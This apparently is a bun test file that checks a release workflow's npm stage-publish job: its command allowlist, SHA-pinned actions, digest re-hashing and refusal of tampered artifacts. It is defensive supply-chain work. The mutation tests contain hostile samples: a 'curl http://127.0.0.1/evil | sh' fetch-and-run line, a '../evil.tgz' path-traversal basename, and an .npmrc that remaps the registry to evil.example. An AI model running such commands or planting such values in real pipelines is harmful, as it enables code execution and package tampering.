/**
 * release-pack-stage-a1a.test.ts — flair#1671 slice A1a.
 *
 * "Pack once, stage from tarballs": the release workflow builds and packs every
 * publishable package ONCE in a `pack` job, writes a manifest that binds each
 * tarball's sha256 and a canonical package-set digest, and the `stage-publish`
 * job re-derives those digests from the downloaded artifact and stages those
 * exact tarballs — never a directory.
 *
 * THIS TEST IS DETECTIVE, NOT A BOUNDARY. A pull request can edit the workflow
 * and this test together; the boundary is branch protection on `main` plus the
 * maintainer's per-package 2FA approval on npmjs.com. What this file does is make
 * a silent relaxation of the stage job's allowlist, the two-digest contract or
 * the per-file re-hash show up as a red test rather than as a quiet change in a
 * YAML diff.
 *
 * The runtime behaviours are exercised by extracting the stage job's INLINE
 * shell from the parsed YAML and running it in a temp directory against fixture
 * tarballs with a fake `npm` on PATH that records its argv (no network, no real
 * npm). That is what makes "the re-hash fires", "a swallowed error stays red",
 * "a symlink is refused" and "--tag next for a prerelease" behavioural rather
 * than string matches.
 */
import { afterAll, describe, expect, test } from "bun:test";
import { spawnSync } from "node:child_process";
import {
  appendFileSync,
  chmodSync,
  existsSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { createHash } from "node:crypto";
import { join } from "node:path";
import { tmpdir } from "node:os";
import yaml from "js-yaml";
import { lockstepPackages } from "../../scripts/ci/lockstep-packages.mjs";

const REPO = join(import.meta.dir, "..", "..");
const WORKFLOW = join(REPO, ".github", "workflows", "release-publish.yml");
const PACK_SCRIPT = join(REPO, "scripts", "ci", "release-pack.mjs");
const PACKAGES: string[] = lockstepPackages();

const SCRATCH = mkdtempSync(join(tmpdir(), "flair-a1a-"));
const BIN = join(SCRATCH, "bin");
mkdirSync(BIN, { recursive: true });

afterAll(() => {
  rmSync(SCRATCH, { recursive: true, force: true });
});

// ── the shape checker, usable on the real file and on mutants ────────────────

const SHA40 = /^[0-9a-f]{40}$/;
/** Simple-command words the stage job's run bodies may use. */
const ALLOWED = new Set([
  "set", "cd", "mkdir", "printf", "echo", "exit", "npm", "jq", "sha256sum",
  "sort", "chmod", "while", "read", "do", "done", "for", "in", "if", "then",
  "else", "fi", "[", ":", "continue",
]);
/** Leading words that are structural, not commands. */
const KEYWORD_STRIP = ["if", "then", "else", "elif", "while", "for", "until", "do", "!"];
const BARE_KEYWORDS = new Set(["done", "fi", "esac", "then", "else", "do", ";;"]);

function stripQuoted(s: string): string {
  return s.replace(/'[^']*'/g, "").replace(/"[^"]*"/g, "");
}

/** Blank out `$( ... )` (balanced) and `$(( ... ))`, collecting the inner text. */
function extractSubstitutions(s: string): { text: string; subs: string[] } {
  const subs: string[] = [];
  let out = "";
  for (let i = 0; i < s.length; i++) {
    if (s[i] === "$" && s[i + 1] === "(" && s[i + 2] === "(") {
      let depth = 0;
      let j = i + 1;
      for (; j < s.length; j++) {
        if (s[j] === "(") depth++;
        else if (s[j] === ")") {
          depth--;
          if (depth === 0) break;
        }
      }
      out += "ARITH";
      i = j;
      continue;
    }
    if (s[i] === "$" && s[i + 1] === "(") {
      let depth = 0;
      let j = i + 1;
      for (; j < s.length; j++) {
        if (s[j] === "(") depth++;
        else if (s[j] === ")") {
          depth--;
          if (depth === 0) break;
        }
      }
      subs.push(s.slice(i + 2, j));
      out += "SUBST";
      i = j;
      continue;
    }
    out += s[i];
  }
  return { text: out, subs };
}

/** The first command word of a shell fragment, or null when it is not a command. */
function leadingCommand(fragment: string): string | null {
  let s = fragment.trim();
  if (!s || s.startsWith("#")) return null;
  if (s.startsWith("}")) return null; // closing brace of a step-summary group
  if (/^for\b/.test(s)) return null; // a loop header is not a command
  while (s.startsWith("(") || s.startsWith("{")) s = s.slice(1).trim();
  let changed = true;
  while (changed) {
    changed = false;
    for (const kw of KEYWORD_STRIP) {
      const re = new RegExp(`^${kw.replace("!", "\\!")}\\b\\s*`);
      if (re.test(s)) {
        s = s.replace(re, "");
        changed = true;
      }
    }
    const asg = /^[A-Za-z_][A-Za-z0-9_]*=/.exec(s);
    if (asg) {
      let rest = s.slice(asg[0].length);
      if (rest.startsWith("${")) {
        let depth = 0;
        let j = 0;
        for (; j < rest.length; j++) {
          if (rest[j] === "{") depth++;
          else if (rest[j] === "}") {
            depth--;
            if (depth === 0) break;
          }
        }
        rest = rest.slice(j + 1);
      } else {
        rest = rest.replace(/^\S+/, "");
      }
      s = rest.trim();
      changed = true;
    }
  }
  if (!s) return null;
  const token = s.split(/\s+/)[0];
  if (token.startsWith("$") || token === "SUBST" || token === "ARITH") return null;
  return token;
}

function splitStatements(line: string): string[] {
  return line.split(/\|\||&&|;|\|/);
}

/** Problems in one run body: eval, backticks, repository code, commands off the set. */
function runBodyProblems(runBody: string): string[] {
  const problems: string[] = [];
  if (/\beval\b/.test(runBody)) problems.push("run body contains eval");
  if (runBody.includes("`")) problems.push("run body contains a backtick");
  if (/\bnode\b/.test(runBody) || runBody.includes("scripts/")) {
    problems.push("run body references repository code (node / scripts/)");
  }
  const { text, subs } = extractSubstitutions(runBody);
  for (const inner of subs) {
    const cmd = leadingCommand(stripQuoted(inner));
    if (cmd && !ALLOWED.has(cmd)) problems.push(`command substitution outside the set: $(${cmd} …)`);
  }
  for (const rawLine of text.split("\n")) {
    const line = stripQuoted(rawLine);
    if (/^\s*#/.test(line)) continue;
    for (const frag of splitStatements(line)) {
      const cmd = leadingCommand(frag);
      if (cmd && !ALLOWED.has(cmd) && !BARE_KEYWORDS.has(cmd)) {
        problems.push(`command outside the set: ${cmd}`);
      }
    }
  }
  return problems;
}

interface StageStep {
  name?: string;
  uses?: string;
  run?: string;
  with?: Record<string, unknown>;
  id?: string;
}
interface WorkflowDoc {
  permissions?: unknown;
  jobs?: Record<string, { permissions?: Record<string, string>; environment?: string; steps?: StageStep[] }>;
}

/** The full stage-job contract. Returns human-readable problems ([] is good). */
export function inspectStageJob(text: string): { problems: string[] } {
  const problems: string[] = [];
  const doc = yaml.load(text) as WorkflowDoc | null;
  if (!doc || typeof doc !== "object") return { problems: ["workflow is not a mapping"] };

  const wfPerm = doc.permissions;
  if (!wfPerm || typeof wfPerm !== "object" || Object.keys(wfPerm as object).length !== 0) {
    problems.push("workflow-level permissions must be {} (opt in per job)");
  }

  const stage = doc.jobs?.["stage-publish"];
  if (!stage) return { problems: [...problems, "no stage-publish job"] };

  const perms = stage.permissions ?? {};
  const permPairs = Object.entries(perms).sort();
  const want = [["contents", "read"], ["id-token", "write"]];
  if (JSON.stringify(permPairs) !== JSON.stringify(want)) {
    problems.push(`stage-publish permissions must be exactly contents: read + id-token: write, got ${JSON.stringify(perms)}`);
  }
  if (stage.environment !== "release") problems.push("stage-publish must keep environment: release (OIDC scoping)");

  const steps = stage.steps ?? [];
  if (steps.length !== 5) problems.push(`stage-publish must have exactly 5 allowlisted steps, got ${steps.length}`);
  const [checkout, setupNode, upgrade, download, stageStep] = steps;

  if (!checkout || !/^actions\/checkout@[0-9a-f]{40}$/.test(checkout.uses ?? "")) {
    problems.push("step 1 must be a SHA-pinned actions/checkout");
  } else if (checkout.with?.["persist-credentials"] !== false) {
    problems.push("the stage checkout must set persist-credentials: false");
  }

  if (!setupNode || !/^actions\/setup-node@[0-9a-f]{40}$/.test(setupNode.uses ?? "")) {
    problems.push("step 2 must be a SHA-pinned actions/setup-node");
  } else if (setupNode.with && "registry-url" in setupNode.with) {
    problems.push("setup-node must NOT set registry-url");
  }

  if (!upgrade?.run || !/npm install -g npm@\d+\.\d+\.\d+/.test(upgrade.run)) {
    problems.push("step 3 must self-upgrade npm to an EXACT version (npm install -g npm@X.Y.Z)");
  } else if (/npm@[\^~]/.test(upgrade.run)) {
    problems.push("the npm self-upgrade must not use a range");
  }

  if (!download || !/^actions\/download-artifact@[0-9a-f]{40}$/.test(download.uses ?? "")) {
    problems.push("step 4 must be a SHA-pinned actions/download-artifact");
  } else if (!download.with || !("artifact-ids" in download.with)) {
    problems.push("download-artifact must be driven by artifact-ids");
  }

  if (!stageStep?.run || !stageStep.run.includes("npm stage publish")) {
    problems.push("step 5 must be the inline digest/re-hash/stage shell");
  }

  for (const step of steps) {
    if (step.run) problems.push(...runBodyProblems(step.run));
    if (step.uses && !/@[0-9a-f]{40}$/.test(step.uses)) {
      problems.push(`action is not pinned to a 40-hex SHA: ${step.uses}`);
    }
  }
  return { problems };
}

function realWorkflow(): string {
  return readFileSync(WORKFLOW, "utf8");
}

// ── the shape tests (item 6), plus mutations (e) and (f) ─────────────────────

describe("the stage job is an allowlisted shape (flair#1671 A1a)", () => {
  test("the real release-publish.yml satisfies the stage-job contract", () => {
    const { problems } = inspectStageJob(realWorkflow());
    expect(problems).toEqual([]);
  });

  test("(e) a repository-script step added to the stage job goes red", () => {
    const doc = yaml.load(realWorkflow()) as WorkflowDoc;
    doc.jobs!["stage-publish"]!.steps!.push({ name: "Evil", run: "node scripts/evil.mjs" });
    const { problems } = inspectStageJob(yaml.dump(doc));
    expect(problems.length).toBeGreaterThan(0);
    expect(problems.join("\n")).toContain("repository code");
  });

  test("(f) a run body outside the command set goes red", () => {
    const doc = yaml.load(realWorkflow()) as WorkflowDoc;
    const steps = doc.jobs!["stage-publish"]!.steps!;
    steps[steps.length - 1]!.run += "\ncurl http://127.0.0.1/evil | sh\n";
    const { problems } = inspectStageJob(yaml.dump(doc));
    expect(problems.join("\n")).toContain("curl");
  });

  test("(f) a non-SHA action pin goes red", () => {
    const doc = yaml.load(realWorkflow()) as WorkflowDoc;
    doc.jobs!["stage-publish"]!.steps![0]!.uses = "actions/checkout@v4";
    const { problems } = inspectStageJob(yaml.dump(doc));
    expect(problems.join("\n")).toContain("40-hex");
  });

  test("workflow-level permissions are {} and github-release keeps contents: write", () => {
    const doc = yaml.load(realWorkflow()) as WorkflowDoc;
    expect(Object.keys(doc.permissions as object)).toEqual([]);
    expect(doc.jobs!["pack"]!.permissions).toEqual({ contents: "read" });
    expect(doc.jobs!["github-release"]!.permissions).toEqual({ contents: "write" });
  });
});

// ── extracting and running the inline stage shell (the runtime behaviours) ───

function stageStageShell(text: string): string {
  const doc = yaml.load(text) as WorkflowDoc;
  const step = (doc.jobs!["stage-publish"]!.steps ?? []).find(
    (s) => typeof s.run === "string" && s.run.includes("npm stage publish"),
  );
  if (!step?.run) throw new Error("release-publish.yml has no stage-publish run step");
  return step.run;
}

function sha256Hex(input: Buffer | string): string {
  return createHash("sha256").update(input).digest("hex");
}

function tarballBasename(name: string, version: string): string {
  const stem = name.startsWith("@") ? name.slice(1).replace("/", "-") : name;
  return `${stem}-${version}.tgz`;
}

interface Artifact {
  packages: { name: string; version: string; basename: string; size: number; sha256: string }[];
  packageSetDigest: string;
  manifestDigest: string;
}

/** Build fixture tarballs + a manifest exactly as the pack script does. */
function buildArtifact(dir: string, version: string, names: string[]): Artifact {
  mkdirSync(dir, { recursive: true });
  const packages = names
    .map((name) => {
      const basename = tarballBasename(name, version);
      const bytes = Buffer.from(`tarball:${name}@${version}`);
      writeFileSync(join(dir, basename), bytes);
      return { name, version, basename, size: bytes.length, sha256: sha256Hex(bytes) };
    })
    .sort((a, b) => (a.name < b.name ? -1 : a.name > b.name ? 1 : 0));
  const lines = packages.map((p) => `${p.name}@${p.version} ${p.sha256}`).sort().join("\n") + "\n";
  const packageSetDigest = sha256Hex(Buffer.from(lines));
  const manifest = { schema: 1, version, packages, packageSetDigest };
  const bytes = Buffer.from(JSON.stringify(manifest, null, 2) + "\n");
  writeFileSync(join(dir, "manifest.json"), bytes);
  return { packages, packageSetDigest, manifestDigest: sha256Hex(bytes) };
}

/** A fake npm that records its argv and cwd, with optional mutation/failure hooks. */
function installFakeNpm(): string {
  const script = `#!/usr/bin/env node
const fs = require("node:fs");
const args = process.argv.slice(2);
if (process.env.NPM_LOG) fs.appendFileSync(process.env.NPM_LOG, JSON.stringify({ argv: args, cwd: process.cwd() }) + "\\n");
const ucIdx = args.indexOf("--userconfig");
if (args[0] === "config" && args[1] === "get" && args[2] === "registry") {
  let line = "(no-userconfig)";
  if (ucIdx !== -1) {
    const uc = String(fs.readFileSync(args[ucIdx + 1], "utf8")).split("\\n").find((l) => l.startsWith("registry="));
    if (uc) line = uc.slice("registry=".length);
  }
  process.stdout.write(line + "\\n");
  process.exit(0);
}
const joined = args.join(" ");
if (process.env.NPM_FAIL_ON && joined.includes(process.env.NPM_FAIL_ON)) process.exit(1);
if (process.env.NPM_MUTATE_ON && joined.includes(process.env.NPM_MUTATE_ON)) {
  // The tarballs are chmod-read-only by the shell; removing and rewriting is
  // how a same-user tamperer would have to do it, and it still changes bytes.
  const target = process.env.NPM_MUTATE_FILE;
  fs.rmSync(target, { force: true });
  fs.writeFileSync(target, "corrupted");
}
process.exit(0);
`;
  const path = join(BIN, "npm");
  writeFileSync(path, script);
  chmodSync(path, 0o755);
  return path;
}

interface RunResult {
  status: number | null;
  out: string;
  log: { argv: string[]; cwd: string }[];
  scratch: string;
  userconfig: string;
}

function runStageShell(
  artifact: Artifact,
  artDir: string,
  envExtra: Record<string, string> = {},
): RunResult {
  installFakeNpm();
  const scratch = mkdtempSync(join(SCRATCH, "run-"));
  const sh = join(scratch, "stage.sh");
  writeFileSync(sh, stageStageShell(realWorkflow()));
  const summary = join(scratch, "summary.md");
  writeFileSync(summary, "");
  const userconfig = join(scratch, "npm-userconfig");
  writeFileSync(userconfig, "registry=https://registry.npmjs.org/\n");
  const log = join(scratch, "npm.log");
  writeFileSync(log, "");
  const r = spawnSync("bash", [sh], {
    cwd: scratch,
    encoding: "utf8",
    env: {
      ...process.env,
      PATH: `${BIN}:${process.env.PATH}`,
      ART_DIR: artDir,
      NPM_USERCONFIG: userconfig,
      PACK_PACKAGE_SET_DIGEST: artifact.packageSetDigest,
      PACK_MANIFEST_DIGEST: artifact.manifestDigest,
      GITHUB_STEP_SUMMARY: summary,
      NPM_LOG: log,
      ...envExtra,
    },
  });
  const records = readFileSync(log, "utf8")
    .split("\n")
    .filter(Boolean)
    .map((l) => JSON.parse(l) as { argv: string[]; cwd: string });
  return { status: r.status, out: `${r.stdout ?? ""}${r.stderr ?? ""}`, log: records, scratch, userconfig };
}

const VERSION = "0.55.2";
const FIXTURE_NAMES = PACKAGES.slice(0, 3); // three real lockstep names

describe("stage-publish stages the exact tarballs it re-derives (flair#1671 A1a)", () => {
  test("positive control: a clean artifact stages every package under --tag staged", () => {
    const dir = mkdtempSync(join(SCRATCH, "clean-"));
    const artifact = buildArtifact(dir, VERSION, FIXTURE_NAMES);
    const r = runStageShell(artifact, dir);
    expect(r.status).toBe(0);
    const publishes = r.log.filter((l) => l.argv[0] === "stage" && l.argv[1] === "publish");
    expect(publishes.length).toBe(FIXTURE_NAMES.length);
    for (const p of publishes) expect(p.argv).toContain("--tag");
    expect(r.log.every((l) => l.cwd === dir)).toBe(true);
  });

  test("(j) a prerelease version stages with --tag next; a stable one with --tag staged", () => {
    const stableDir = mkdtempSync(join(SCRATCH, "stable-"));
    const stable = buildArtifact(stableDir, VERSION, FIXTURE_NAMES);
    const stableRun = runStageShell(stable, stableDir);
    expect(stableRun.status).toBe(0);
    for (const p of stableRun.log.filter((l) => l.argv[0] === "stage")) {
      expect(p.argv[p.argv.indexOf("--tag") + 1]).toBe("staged");
    }

    const preDir = mkdtempSync(join(SCRATCH, "pre-"));
    const pre = buildArtifact(preDir, "0.55.2-qualify.1", FIXTURE_NAMES);
    const preRun = runStageShell(pre, preDir);
    expect(preRun.status).toBe(0);
    const prePublishes = preRun.log.filter((l) => l.argv[0] === "stage");
    expect(prePublishes.length).toBe(FIXTURE_NAMES.length);
    for (const p of prePublishes) {
      expect(p.argv[p.argv.indexOf("--tag") + 1]).toBe("next");
    }
  });

  test("(i) a staging error is NOT swallowed (a failing npm fails the job)", () => {
    const dir = mkdtempSync(join(SCRATCH, "fail-"));
    const artifact = buildArtifact(dir, VERSION, FIXTURE_NAMES);
    const r = runStageShell(artifact, dir, { NPM_FAIL_ON: artifact.packages[0]!.basename });
    expect(r.status).not.toBe(0);
    expect(r.out).toContain("nothing staged");
    // Only the failing call was attempted; nothing after it.
    expect(r.log.filter((l) => l.argv[0] === "stage").length).toBe(1);
  });

  test("(b) a tarball mutated after the digest check is refused on the per-file re-hash", () => {
    const dir = mkdtempSync(join(SCRATCH, "mutate-"));
    // Names are sorted by the manifest; mutate the LAST one while staging the
    // FIRST, so the pre-stage set digest has already passed.
    const artifact = buildArtifact(dir, VERSION, FIXTURE_NAMES);
    const first = artifact.packages[0]!.basename;
    const last = artifact.packages[artifact.packages.length - 1]!.basename;
    const r = runStageShell(artifact, dir, {
      NPM_MUTATE_ON: first,
      NPM_MUTATE_FILE: join(dir, last),
    });
    expect(r.status).not.toBe(0);
    expect(r.out).toContain("re-hash");
    expect(r.out).toContain("INCOMPLETE");
    // The first package was staged; the mutated one was NOT.
    const staged = r.log.filter((l) => l.argv[0] === "stage").map((l) => l.argv.join(" "));
    expect(staged.some((s) => s.includes(first))).toBe(true);
    expect(staged.some((s) => s.includes(last))).toBe(false);
  });

  test("(h) an artifact with a symlink is refused before any stage request", () => {
    const dir = mkdtempSync(join(SCRATCH, "symlink-"));
    const artifact = buildArtifact(dir, VERSION, FIXTURE_NAMES);
    // Replace one tarball with a symlink to another file.
    const victim = join(dir, artifact.packages[0]!.basename);
    rmSync(victim);
    symlinkSync(join(dir, artifact.packages[1]!.basename), victim);
    expect(lstatSync(victim).isSymbolicLink()).toBe(true);
    const r = runStageShell(artifact, dir);
    expect(r.status).not.toBe(0);
    expect(r.out).toContain("symlink");
    expect(r.log.filter((l) => l.argv[0] === "stage").length).toBe(0);
  });

  test("(h) an artifact whose manifest names a ../ path is refused before any stage request", () => {
    const dir = mkdtempSync(join(SCRATCH, "escape-"));
    const artifact = buildArtifact(dir, VERSION, FIXTURE_NAMES);
    const manifestPath = join(dir, "manifest.json");
    const manifest = JSON.parse(readFileSync(manifestPath, "utf8")) as {
      packages: { basename: string }[];
    };
    manifest.packages[0]!.basename = "../evil.tgz";
    const bytes = Buffer.from(JSON.stringify(manifest, null, 2) + "\n");
    writeFileSync(manifestPath, bytes);
    // Recompute the manifest digest so we reach the basename check, not the digest gate.
    artifact.manifestDigest = sha256Hex(bytes);
    const r = runStageShell(artifact, dir);
    expect(r.status).not.toBe(0);
    expect(r.out).toContain("unsafe basename");
    expect(r.log.filter((l) => l.argv[0] === "stage").length).toBe(0);
  });

  test("(g) a candidate workspace .npmrc in the artifact is inert — the job userconfig is used", () => {
    const dir = mkdtempSync(join(SCRATCH, "npmrc-"));
    const artifact = buildArtifact(dir, VERSION, FIXTURE_NAMES);
    // A registry remap shipped inside the artifact, where npm would read it upward.
    writeFileSync(join(dir, ".npmrc"), "registry=http://evil.example/\n");
    const r = runStageShell(artifact, dir);
    expect(r.status).toBe(0);
    const publishes = r.log.filter((l) => l.argv[0] === "stage");
    expect(publishes.length).toBe(FIXTURE_NAMES.length);
    for (const p of publishes) {
      const idx = p.argv.indexOf("--userconfig");
      expect(idx).toBeGreaterThan(-1);
      expect(p.argv[idx + 1]).not.toContain(dir); // not the artifact's .npmrc
    }
    // And the userconfig itself resolves to the public registry, not the remap.
    const cfgLog = join(r.scratch, "cfg.log");
    const cfg = spawnSync(
      join(BIN, "npm"),
      ["config", "get", "registry", "--userconfig", r.userconfig],
      { encoding: "utf8", env: { ...process.env, NPM_LOG: cfgLog } },
    );
    expect(cfg.status).toBe(0);
    expect(cfg.stdout.trim()).toBe("https://registry.npmjs.org/");
  });
});

// ── the pack script: exact pins and the tarball set (items 1 & 2) ─────────────

function writeFakePackNpm(): void {
  const script = `#!/usr/bin/env node
const fs = require("node:fs");
const path = require("node:path");
const args = process.argv.slice(2);
const dest = args[args.indexOf("--pack-destination") + 1];
const pkg = JSON.parse(fs.readFileSync(path.join(process.cwd(), "package.json"), "utf8"));
const stem = pkg.name.startsWith("@") ? pkg.name.slice(1).replace("/", "-") : pkg.name;
const filename = stem + "-" + pkg.version + ".tgz";
if (process.env.NPM_PACK_SKIP === pkg.name) {
  process.stdout.write(JSON.stringify([]) + "\\n");
  process.exit(0);
}
fs.writeFileSync(path.join(dest, filename), "tarball:" + pkg.name + "@" + pkg.version);
process.stdout.write(JSON.stringify([{ filename }]) + "\\n");
process.exit(0);
`;
  const path = join(BIN, "npm");
  writeFileSync(path, script);
  chmodSync(path, 0o755);
}

interface PackFixture {
  dir: string;
  dirs: string[];
}

/** A minimal publishable workspace: root + packages/<name>. */
function makePackFixture(opts: {
  version: string;
  packages: Record<string, { private?: boolean; deps?: Record<string, string> }>;
  rootVersion?: string;
}): PackFixture {
  const dir = mkdtempSync(join(SCRATCH, "pack-"));
  writeFileSync(
    join(dir, "package.json"),
    JSON.stringify({ name: "@tpsdev-ai/root", version: opts.rootVersion ?? opts.version, workspaces: ["packages/*"] }, null, 2),
  );
  const dirs = ["."];
  for (const [pkg, meta] of Object.entries(opts.packages)) {
    const pdir = join(dir, "packages", pkg);
    mkdirSync(pdir, { recursive: true });
    const manifest: Record<string, unknown> = { name: `@tpsdev-ai/${pkg}`, version: opts.version };
    if (meta.private) manifest.private = true;
    if (meta.deps) manifest.dependencies = meta.deps;
    writeFileSync(join(pdir, "package.json"), JSON.stringify(manifest, null, 2));
    if (!meta.private) dirs.push(`packages/${pkg}`);
  }
  return { dir, dirs };
}

function runPackScript(fixture: PackFixture, out: string, extraDirs?: string[]) {
  writeFakePackNpm();
  const dirs = extraDirs ?? fixture.dirs;
  return spawnSync(
    process.execPath,
    [PACK_SCRIPT, "--root", fixture.dir, "--out", out, "--version", "1.2.3", "--dirs", ...dirs],
    { encoding: "utf8", env: { ...process.env, PATH: `${BIN}:${process.env.PATH}` } },
  );
}

describe("the pack script enforces the exact-pin invariant and the tarball set", () => {
  test("positive control: exact pins, one tarball per package, a manifest written", () => {
    const fixture = makePackFixture({
      version: "1.2.3",
      packages: { a: {}, b: { deps: { "@tpsdev-ai/a": "1.2.3" } } },
    });
    const out = mkdtempSync(join(SCRATCH, "out-"));
    const r = runPackScript(fixture, out);
    expect(r.status).toBe(0);
    const manifest = JSON.parse(readFileSync(join(out, "manifest.json"), "utf8"));
    expect(manifest.packages.map((p: { name: string }) => p.name)).toEqual(["@tpsdev-ai/a", "@tpsdev-ai/b", "@tpsdev-ai/root"]);
    expect(manifest.packageSetDigest).toMatch(/^[0-9a-f]{64}$/);
    expect(r.stdout).toContain("package-set-digest=");
  });

  test("(c) one caret @tpsdev-ai/* pin fails the pack before any tarball is built", () => {
    const fixture = makePackFixture({
      version: "1.2.3",
      packages: { a: {}, b: { deps: { "@tpsdev-ai/a": "^1.2.3" } } },
    });
    const out = mkdtempSync(join(SCRATCH, "out-"));
    const r = runPackScript(fixture, out);
    expect(r.status).not.toBe(0);
    expect(`${r.stdout}${r.stderr}`).toContain("exact-pin");
    expect(readdirSync(out).filter((f) => f.endsWith(".tgz")).length).toBe(0);
  });

  test("(d) skipping a package fails the pack", () => {
    const fixture = makePackFixture({ version: "1.2.3", packages: { a: {}, b: {} } });
    const out = mkdtempSync(join(SCRATCH, "out-"));
    const r = runPackScript(fixture, out, fixture.dirs.filter((d) => d !== "packages/b"));
    expect(r.status).not.toBe(0);
    expect(`${r.stdout}${r.stderr}`).toContain("missing");
  });

  test("(d) packing a package twice (a duplicated directory) fails the pack", () => {
    const fixture = makePackFixture({ version: "1.2.3", packages: { a: {}, b: {} } });
    const out = mkdtempSync(join(SCRATCH, "out-"));
    const r = runPackScript(fixture, out, [...fixture.dirs, "packages/a"]);
    expect(r.status).not.toBe(0);
    expect(`${r.stdout}${r.stderr}`).toContain("twice");
  });

  test("(d) an extra tarball in the output directory fails the pack", () => {
    const fixture = makePackFixture({ version: "1.2.3", packages: { a: {}, b: {} } });
    const out = mkdtempSync(join(SCRATCH, "out-"));
    const r = runPackScript(fixture, out);
    expect(r.status).toBe(0);
    // A stray tarball in the output directory (a second pack, or a stray file)
    // must refuse rather than be silently carried into the manifest.
    const out2 = mkdtempSync(join(SCRATCH, "out-"));
    writeFileSync(join(out2, "rogue-9.9.9.tgz"), "stale");
    const r2 = runPackScript(fixture, out2);
    expect(r2.status).not.toBe(0);
    expect(`${r2.stdout}${r2.stderr}`).toContain("unexpected");
  });
});
